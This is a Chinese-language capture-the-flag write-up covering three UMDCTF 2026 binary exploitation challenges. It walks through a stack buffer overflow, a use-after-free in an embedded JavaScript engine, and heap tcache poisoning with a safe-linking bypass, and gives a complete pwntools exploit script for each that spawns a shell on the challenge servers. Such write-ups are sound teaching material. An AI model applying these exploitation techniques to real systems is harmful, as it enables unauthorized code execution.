@@ -1,0 +1,263 @@
+Source: https://yhalo.cn/1978/umdctf-2026-pwn-wp-by-yhalo/
+
+ipv4
+这道题是有后门的
+调用win()的地方看下
+a1不为0.0.0.0，并且要等于100.72.7.67才可以return win
+再看下main函数
+函数原型显示有点问题，改改
+要让程序流执行到check_rine
+输入的Source Host和Dest Host是valid就可以
+一共4个scanf，最后一个scanf限制了输入大小48个字节
+最后传入check_rine的参数是v5
+可以发现v5[0]的位置被初始化固定写成0.0.0.0
+Desthost碰不到v5[0]
+但是调试的时候发现这个payload：b’1.1.1.1’+b’a’*(0x30-len(‘1.1.1.1’))
+可以让v5[0]为空，这样就绕过了0.0.0.0的检查
+后来查原因，scanf 会自动在字符串末尾加 \x00，我填满了DsetHost后刚好在末尾加\x00就溢出覆盖了v5[0]的头部一点导致破坏了0.0.0.0
+但是想要让v5[0]变成100.72.7.67基本不行
+只能想办法让SourceHost溢出继续往下覆盖到返回地址retwin,正好SourceHost是scanf(”%s”)没有限制
+前面一样是写1.1.1.1，为了绕过地址有效性检查
+payload=b’1.1.1.1’+b’a’*(0x68-len(‘1.1.1.1’))+p64(win)
+最后需要栈对齐一下
+exp
+from pwn import *
+context(arch='amd64', os='linux',log_level='debug')
+#io=process('./ipv4')
+io=remote('challs.umdctf.io',30308)
+win=0x402F45
+ret=0x40101a
+payload1=b'1.1.1.1'+b'a'*(0x68-len('1.1.1.1'))+p64(ret)+p64(win)
+payload2=b'1.1.1.1'+b'a'*(0x30-len('1.1.1.1'))
+log.success(payload1)
+io.recvuntil('What is your Source ASN Prefix?')
+io.sendline('1.1.1.1')
+io.recvuntil('What is your Source Host Address?')
+io.sendline(payload1)
+io.recvuntil('What is your Destination ASN Prefix?')
+io.sendline('1.1.1.1')
+io.recvuntil('What is your Destination Host Address?')
+io.sendline(payload2)
+​
+io.interactive()
+bookmaker
+Arch:       amd64-64-little
+RELRO:      Full RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        PIE enabled
+FORTIFY:    Enabled
+SHSTK:      Enabled
+IBT:        Enabled
+没有canary
+查字符串bin/sh发现后门
+这个函数很好认,会打印一条 market resolved YES: %s,然后 fflush(stdout),最后 system(“/bin/sh”)
+顺手再看看上面的market resolved NO
+查看引用，sub_B980
+这里创建了一个0x30的对象结构体，并且把subB390这个函数回调放进去，作为resolver
+sub_B390还有一个引用在主函数里
+subB890被主函数引用，被映射为mintWire这个脚本层名字
+主函数是一个嵌入式js脚本执行终端
+main 前半段大块代码只是读脚本
+分两种读脚本方法，一个是从文件读JS，另一个是直接从stdin读JS，直到遇到END_MARKET_SCRIPT
+中间一段把 C 函数注册成 JS 里的全局方法
+主要是两个特殊的构造函数，Ldeger和Wire,独树一帜和其他的注册函数明显不一样
+这里看看off_C6D60,里面刚好放了4个字段，view ， recycle ，resize ，serial
+推测这是一个方法表
+重点看下js_Ledger_ctor，做了两次malloc分配，
+第一次分配固定大小的ledger对象
+第二次给用户可控大小的buf
+看看js_help
+关键的信息，可以把函数逻辑看到很清楚
+重点再看看ledger.view()和ledger.recycle
+ledger.view()把：原始地址 ledger->buf,原始长度 ledger->size
+直接交给了 JS 包装函数
+基于现有 native 内存创建 ArrayBuffer
+如果 buf == NULL 或 size == 0,就报错：ledger has no buffer
+也就是view() 会把这块 native buffer 直接暴露给 JS
+然后是js_ledger_recycle
+这里做了free(ledger->buf)，但是没有把buf=null，也没有把ledger->size=0
+属于很明显的UAF漏洞，free了之后，旧 view 不失效，JS 侧仍然能通过旧 view 读写已释放内存
+那基本的利用链就完整了，思路就是制造堆块重叠
+Ledger(size)分配一个 native buf
+ledger.view()返回一个直接 alias 到 buf JS buffer
+ledger.recycle()对 buf 调 free
+旧 view 不失效，JS 侧仍然能通过旧 view 读写已释放内存
+mintWire()再申请一个 0x30 大小的 Wire 对象，复用这块 freed chunk
+view 覆盖到 Wire，旧 view 现在读写的其实是 Wire 结构体，可以通过读sub_B390这个resolver来泄露pie基地址
+后续改 Wire 的字段， qword_CC108 正好在&unk_CC120前面 0x18 字节，所以：global_resolver = data_ptr – 0x18
+接着把当前 Wire 的目标指针改成 qword_CC108，再把 backdoor地址覆写qword_CC108
+最后全局resolver就可以跳到backdoor
+exp
+from pwn import *
+​
+context(arch='amd64',os='linux',log_level='info')
+context.binary = ELF("./bookmaker")
+​
+​
+js = r"""
+function r64(dv, off) {
+let v = 0;
+let m = 1;
+for (let i = 0; i < 8; i++) {
+v += dv.getUint8(off + i) * m;
+m *= 256;
+}
+return v;
+}
+​
+function w64(dv, off, v) {
+for (let i = 0; i < 8; i++) {
+dv.setUint8(off + i, v & 0xff);
+v = Math.floor(v / 256);
+}
+}
+​
+function ab64(v) {
+let b = new ArrayBuffer(8);
+let d = new DataView(b);
+w64(d, 0, v);
+return b;
+}
+​
+let ledger = new Ledger(48);
+let view = ledger.view();
+let dv = new DataView(view);
+ledger.recycle();
+​
+let id = mintWire();
+​
+let data_ptr = r64(dv, 0);
+let resolver = r64(dv, 24);
+let pie = resolver - 0xb390;
+let backdoor = pie + 0xb3c0;
+let global_resolver = data_ptr - 0x18;
+​
+w64(dv, 0, global_resolver);
+w64(dv, 8, 8);
+wireWrite(id, ab64(backdoor));
+settle("owned");
+__END_MARKET_SCRIPT__
+"""
+​
+io = remote("challs.umdctf.io", 30307)
+io.send(js.encode())
+​
+io.interactive()
+​
+​
+velvet-table
+Arch:       amd64-64-little
+RELRO:      Full RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        PIE enabled
+FORTIFY:    Enabled
+SHSTK:      Enabled
+IBT:        Enabled
+查看字符串发现bin/sh
+顺着找到后门函数
+看主函数
+基本就是一个堆题菜单
+去符号了，先把Seat_table的结构还原出来，再在ida里新建结构体逆一下就可以清晰点
+选项2很明显的没有清指针，UAF漏洞
+这个idx是输入的saeat于seat_key异或后再经过计算出来的，后面的选项也都是这样
+seat_key来源
+选项3相当于edit，更新chunk内容，但是这个copy_size给的可以输入非常大，有个开关是cancopy,初始默认值是0
+选项4这里相当于show，它只检查了seat_table[idx].ptr，却没有看used，也就是说UAF读成立，只是读出来的是被加密混淆过的信息
+secret也来自开头的v54地址混淆
+选项6这里给了一个函数调用点，前置条件是count为奇数，而且需要让栈上的v56满足条件才能调用v55()
+选项7的作用就是让之前选项3的cancopy的值变成1，开启开关，限制是count要大于6
+count的处理在选项2的末尾，size不为256和384这两个特殊值就可以进到cashed_out,cashed_out分支就是让count+1
+另外，每次malloc一次也会给count+2
+开头这里给出了运行时的栈上局部变量v54地址的混淆，从而可以逆推出secret和seat_key
+就能够解密选项4的内容和真正的idx
+基本的利用链思路就是，先申请多个chunk让count满足条件，count要大于6的话需要4次malloc，把cancopy开关打开，利用UAF形成堆块投毒，其中需要绕一下safe-linking，让分配落到函数调用点v55()旁边，然后show展示出函数地址，用来算pie基址，接着利用update功能把函数的v55()和v56()一起覆盖了，v55()覆盖成后门地址，v56覆盖成满足条件的guard，最后选项6调用后门函数
+看下leak的v54地址附近，+0x20偏移位置就是v55
+把下一次分配落在v55附近，拿到地址减去1b50偏移刚好算出运行时的pie基地址，顺便还可以调整v56满足调用guard
+exp
+from pwn import *
+context(arch='amd64', os='linux', log_level='debug')
+context.terminal=['cmd.exe','/c','start','wsl.exe','bash','-c']
+elf=ELF("velvet-table")
+io=process("velvet-table")
+io.recvuntil("table marker:")
+leak_value=int(io.recvline().strip(),16)
+shift=leak_value ^ 0x9AC90307
+leak_addr = 0x7FF000000000 | (((leak_value ^ 0x9AC90307) & 0xffffffff) << 4)
+log.info("leak_addr: "+hex(leak_addr))
+target_addr=leak_addr+0x20
+log.success(f"target_addr: {hex(target_addr)}")
+secret = (shift ^ 0x5A17C3D9) & 0xffffffff
+seat_key = (shift ^ 0x7E) & 0xF
+​
+v48= secret<< 32
+def seat(idx):
+return((idx-3)&0xf)^seat_key
+def malloc(idx, size):
+io.sendlineafter(b"> ",b"1")
+io.sendlineafter(b"seat: ",str(seat(idx)).encode())
+io.sendlineafter(b"size: ",str(size).encode())
+def free(idx):
+io.sendlineafter(b"> ",b"2")
+io.sendlineafter(b"seat: ",str(seat(idx)).encode())
+​
+def update(idx,data):
+io.sendlineafter(b"> ",b"3")
+io.sendlineafter(b"seat: ",str(seat(idx)).encode())
+io.sendlineafter(b"length: ",str(len(data)).encode())
+io.sendafter(b"data:\n",data)
+def show(size,idx):
+n = min(size, 64)
+io.sendlineafter(b"> ",b"4")
+io.sendlineafter(b"seat: ",str(seat(idx)).encode())
+out = io.recvuntil(b"\n\n1)")
+io.unrecv(b"\n\n1)")
+return out[:-4]
+​
+def decode_show(data, idx):
+out = bytearray()
+base = (idx * 0x45D9F3B) ^ secret
+for i, b in enumerate(data):
+r = (idx + i) & 7
+x = (base ^ (i * 0x9E37)) & 0xffffffff
+k = (((x << r) | (x >> (32 - r))) & 0xffffffff) & 0xff
+out.append(b ^ k)
+return bytes(out)
+​
+​
+def cancopy():
+io.sendlineafter(b"> ",b"7")
+​
+​
+malloc(0,0x88)
+malloc(1,0x88)
+line = io.recvline().strip()
+chunk_addr = int(line.split(b": ")[1], 16)
+log.success(f"chunk_addr: {hex(chunk_addr)}")
+malloc(2,0x88)
+malloc(3,0x88)
+io.recvuntil(b"reservation confirmed:")
+cancopy()
+free(0)
+free(1)
+safe_linking=p64(target_addr^(chunk_addr>>12))
+log.success(f"safe_linking: {hex(target_addr^(chunk_addr>>12))}")
+update(1,safe_linking)
+malloc(4,0x88)
+malloc(5,0x88)
+gdb.attach(io)
+pause()
+data=show(0x88,5)
+leak=decode_show(data,5)
+func = u64(leak[:8])
+pie=func-0x1b50
+win=pie+0x1b60
+guard=v48^win^0x686F7573655F6564
+update(5, p64(win)+p64(guard))
+free(2)  #count+1
+io.sendlineafter(b"> ", b"6")
+​
+io.interactive()
+ctf
+pwn
